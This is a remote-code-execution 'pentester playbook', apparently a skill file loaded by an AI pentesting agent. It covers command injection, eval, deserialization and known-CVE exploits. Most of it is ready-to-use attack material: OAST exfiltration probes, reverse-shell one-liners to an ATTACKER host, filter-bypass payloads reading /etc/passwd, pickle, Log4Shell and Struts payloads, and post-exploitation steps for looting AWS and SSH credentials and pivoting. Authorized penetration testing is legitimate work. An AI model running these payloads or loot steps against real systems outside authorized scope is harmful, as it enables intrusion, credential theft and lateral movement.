---
slug: rce
applies_to: [pentester, coder]
owasp: A03
related: [ssti, insecure_file_uploads, path_traversal_lfi_rfi]
---

# Remote Code Execution — Pentester Playbook

> Load this when recon or the analyst surfaced any pathway that ends with
> user input crossing into an interpreter: shell argv, eval(), template
> evaluation, deserialization, dynamic imports, or unsafe library calls
> with shell semantics.

## When to load this

RCE has the largest variety of any vuln class. The hypotheses to load this for:

- A vulnerable version of a known-RCE library was fingerprinted (Log4Shell, Spring4Shell, Struts2, Apache Commons Collections, Jackson, FasterXML)
- An endpoint takes filenames, paths, or commands that look shell-like
- An endpoint accepts uploads of executable content (PHP, JSP, ASPX, Lambda zip) — pair with `insecure_file_uploads`
- A search/filter feature accepts what looks like a query DSL (XPath, JEXL, JSON-e, Velocity, Twig, Jinja, ERB)
- A "report builder" or "custom formula" feature — these almost always end in eval
- Anything that takes URLs/hostnames AND processes them with `system()`, `os.popen`, `subprocess` with `shell=True`
- Deserialization endpoints (`Content-Type: application/x-java-serialized-object`, `application/x-php-serialized`, `application/octet-stream` to `pickle.loads`)

## What you're looking for

Five distinct RCE families. Identify which one you're working with before crafting payloads — the testing approach is totally different per family:

- **Command injection.** Input is concatenated into a shell command. Look for inputs that affect filenames, image conversions, network commands, archive operations.
- **Code evaluation.** Input is passed to `eval`, `exec`, `Function()`, `new Function`, language-level dynamic execution.
- **Template injection (SSTI).** Input is interpolated into a server-side template that supports expressions. Separate skill — load `ssti` for that.
- **Deserialization.** Input is parsed as a serialized object graph and the parser instantiates arbitrary classes. Targets: Java native serialization, PHP `unserialize`, Python `pickle`, .NET `BinaryFormatter`, Ruby `Marshal.load`.
- **Library-specific known-CVE RCE.** A specific endpoint pattern triggers a known bug — Log4Shell via JNDI lookup in any logged string, Spring4Shell via class-bind manipulation on POJOs, ImageMagick "ImageTragick" via SVG.

## First moves

Don't fire ten shells in parallel — RCE probes are noisy and risky. Sequence:

1. **Cheap blind detection via OAST.** For every input you suspect, try `$(curl OAST_HOST/$(id))` (Linux) and `${IFS}curl${IFS}OAST_HOST` (whitespace-filtered). If a DNS or HTTP request lands carrying `uid=` content, you have OS-level command execution with output substitution.

2. **Time-based probe.** If OAST is filtered: `;sleep 5`, `& timeout 5`, `|sleep 5`, `` `sleep 5` ``, `$(sleep 5)`. Send each variant individually, measure response time. A repeatable 5-second response confirms execution.

3. **Known-CVE fingerprint sweep.** Run `nuclei -t cves/` against the target with the version data from recon — `log4j-rce`, `spring4shell`, `struts2-*`, `gitlab-rce`, `confluence-ognl-*` etc. Often turns "we think this might be vulnerable" into "we have a working exploit" in minutes.

4. **Deserialization probe with `ysoserial`.** If the target accepts serialized payloads, generate a `Runtime.exec("curl OAST_HOST")` gadget chain with `ysoserial` and submit. The library list of working gadgets depends on what's on the classpath — try CommonsCollections1, CommonsBeanutils1, Spring1, Hibernate1.

5. **Template injection sniff test.** For inputs that get reflected: send `{{7*7}}`, `${7*7}`, `#{7*7}`, `*{7*7}`, `@{7*7}`, `<%= 7*7 %>`. A response containing `49` confirms template evaluation. Different markers point to different engines — `{{...}}` for Jinja/Twig/Handlebars, `${...}` for Velocity/FreeMarker/Thymeleaf, `<%=...%>` for ERB/EJS/JSP.

## Confirming a hit

Single-signal RCE reports are dangerous to ship — a false claim of RCE is the most embarrassing finding type. Require two independent confirmations:

### Out-of-band with content
Best: payload runs a command that emits the result via DNS/HTTP back to you. `$(id)` substituted into a `curl` to your OAST host. The arriving subdomain or query string contains `uid=0` or whatever — that's incontrovertible.

### Time + content
If OAST is unreachable: combine timing (predictable sleep) with a second test that varies sleep duration (`sleep 3` vs `sleep 7`). Both timings should match within ±0.5s. A single 5-second response could be coincidence; matching 3s/7s pair is not.

### Filesystem oracle
For RCEs that don't have outbound network: write a file with known content to a web-readable path (`echo PROOF > /var/www/html/proof.txt`) and read it back via a public URL. Confirms execution + write capability.

### Reverse shell
The most useful but most disruptive confirmation — drop a real shell. Save this for explicit scope authorization. `bash -i >& /dev/tcp/ATTACKER/4444 0>&1` is the classic; `curl ATTACKER/shell.sh | bash` is the polyglot version. Get explicit permission before running this against anything you don't own outright.

## Going deeper — by family

### Command injection
The argv parsing of the underlying shell matters. `bash` and `sh` accept `$(...)`, `\` `...\` `, `;`, `|`, `&`, `&&`, `||`, `\n`, `\r`. Restricted shells (busybox `ash`, `dash`) accept a subset. Common bypasses for character filters:
- **Quotes blocked.** `cat$IFS/etc/passwd` (use `$IFS` to inject spaces without literal space)
- **Spaces blocked.** `{cat,/etc/passwd}` brace expansion, `cat</etc/passwd` redirect, `<(cat /etc/passwd)` process substitution
- **`/` blocked.** `${PATH:0:1}etc${PATH:0:1}passwd` builds `/etc/passwd` from `$PATH`
- **Specific binaries blocked.** Use full path or absolute path: `/bin/cat` if `cat` is blocked. Use built-ins: `printf "%s\n" *` instead of `ls`. Use `python -c`, `perl -e`, `awk 'BEGIN{system(...)}'`.

### Code evaluation
- **Python `eval`/`exec`.** `__import__('os').system('id')`, `[].__class__.__base__.__subclasses__()` chains for sandbox escape.
- **JavaScript `eval`/`Function`.** Browser context is sandbox-bound but `Function("return process")()` in Node.js gives `process.mainModule.require('child_process').exec(...)`.
- **PHP `eval`/`assert`/`create_function`.** `system('id')` directly; if PHP functions are disabled try `passthru`, `shell_exec`, `proc_open`, ` `` ` (backticks), `popen`.

### Deserialization
- **Java.** `ysoserial` produces gadget chains for Apache Commons Collections (1-7), Beanutils, Spring, Hibernate, MyFaces. Detection: send a recognizable serialized blob (starts with `\xac\xed\x00\x05` for native Java) and watch for `ClassNotFoundException` errors that reveal the classpath.
- **Python.** `pickle.loads` of any controlled blob = RCE. Detection: encode `cos\nsystem\n(S'id'\ntR.` as the pickle body and watch the response. Modern apps use `jsonpickle` or `marshmallow` — still vulnerable if used wrong.
- **PHP.** `unserialize` of controlled string + presence of magic methods (`__wakeup`, `__destruct`, `__toString`) on classes loaded into the request. Composer projects often have hundreds of classes loaded — gadget chains in Symfony, Laravel, Magento are well-documented.
- **.NET.** `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `NetDataContractSerializer` are all RCE-vulnerable. `ysoserial.net` generates payloads.
- **Ruby.** `Marshal.load` of controlled data = RCE if Rails is present (gadget chain through ActiveSupport).

### Library-specific RCE
- **Log4Shell (CVE-2021-44228).** `${jndi:ldap://OAST_HOST/x}` in any input that gets logged. Test User-Agent, Referer, X-Forwarded-For, request body, error messages — anywhere the app might log user input.
- **Spring4Shell (CVE-2022-22965).** POST request with `class.module.classLoader.resources.context.parent.pipeline.first.pattern=...` — manipulates a logger pattern to write a JSP webshell.
- **Struts2 (multiple CVEs).** OGNL expression injection in headers (`Content-Type`, `Content-Disposition`), URL parameters, multipart filenames. Payload format: `%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(...).(#cmd='id')...}`.
- **ImageMagick (CVE-2016-3714).** SVG/MVG upload triggers `convert` with shell-interpreted filename. Use `polyglot.gif` or embed in actual image uploads.

## When filters get in the way

- **Spaces filtered.** `$IFS`, `${IFS}`, `<` (redirect), `{cmd,arg}`, `%09` (tab URL-encoded)
- **Specific keywords blocked.** Concat with empty vars: `s""leep`, `s'$x'leep` where `$x` is unset. Backticks evaluate inside double quotes: `s"$(echo l)"eep`.
- **Length-limited.** Truncate output with `;sleep 5` shortest forms. Use `$0` if `bash` is blocked. Use globbing: `/???/??t` matches `/bin/cat`.
- **Output stripped from response.** Switch to OAST. If even OAST is blocked, write to a known-reachable file path and fetch it later.
- **WAF normalizes input.** Use unicode/UTF-8 variants of shell metacharacters. Some WAFs decode `%c0%80` (overlong null) differently from the shell.
- **Encoding mismatches.** Some apps base64-decode input before passing to shell; nest base64-encoded payloads to bypass keyword filters.

## Escalation paths

You have shell. Now what:

1. **Establish a stable channel.** Drop a reverse shell, then upgrade to a TTY (`python -c 'import pty; pty.spawn("/bin/bash")'`, `script -qc /bin/bash /dev/null`, `stty raw -echo; fg`).
2. **Map privilege.** `id`, `whoami`, `sudo -l`, `cat /etc/passwd`, `find / -perm -4000 2>/dev/null` (suid binaries), `getcap -r / 2>/dev/null` (capabilities). On Windows: `whoami /priv`, `net user %USERNAME%`, `systeminfo`, `tasklist /v`.
3. **Loot.** `~/.aws/credentials`, `~/.ssh/id_*`, `/app/.env`, `/etc/secrets/`, `/var/lib/secrets/`. Cloud metadata (re-use SSRF playbook). Browser cookie/keychain stores if interactive user.
4. **Pivot.** Internal network scan from the compromised host. `ss -tnlp` for local services, `arp -a` for L2 neighbors, `cat /etc/hosts`.
5. **Persistence.** Skip for pentest scope unless explicitly authorized.

## What a real finding looks like

- The exact request that triggers execution
- The OAST log entry, response timing measurement, or shell output proving execution
- The command output (`id`, `uname -a`, `hostname`) that proves which host/user the code ran as
- Privilege boundary you reached (web user only, or root via misconfig)
- The fix recommendation — usually "stop passing user input to a shell" or "stop deserializing untrusted data," with specifics for the language/library detected

## Common false positives

- **Reflected payload that looks like execution.** `{{7*7}}` echoed back as `{{7*7}}` (not `49`) is reflection, not eval.
- **WAF reflecting on test patterns.** Some WAFs respond with 200 + the test payload echoed as part of the block page. Looks like reflection, isn't.
- **Sleep-based confirms that match because of rate limits.** A 5-second delay could be your WAF throttling you, not your shell sleeping. Test with non-`sleep` commands that also take time (`md5sum /dev/urandom &` for a few seconds) to differentiate.
- **`ysoserial` payload triggering an error but no execution.** A `ClassNotFoundException` proves the gadget chain class isn't on the classpath — not that RCE works. Try other gadget chains.

## Related skills

`ssti` for template-engine-specific RCE, `insecure_file_uploads` for the upload-to-shell path, `path_traversal_lfi_rfi` for LFI-to-RCE chains (log poisoning, /proc tricks).
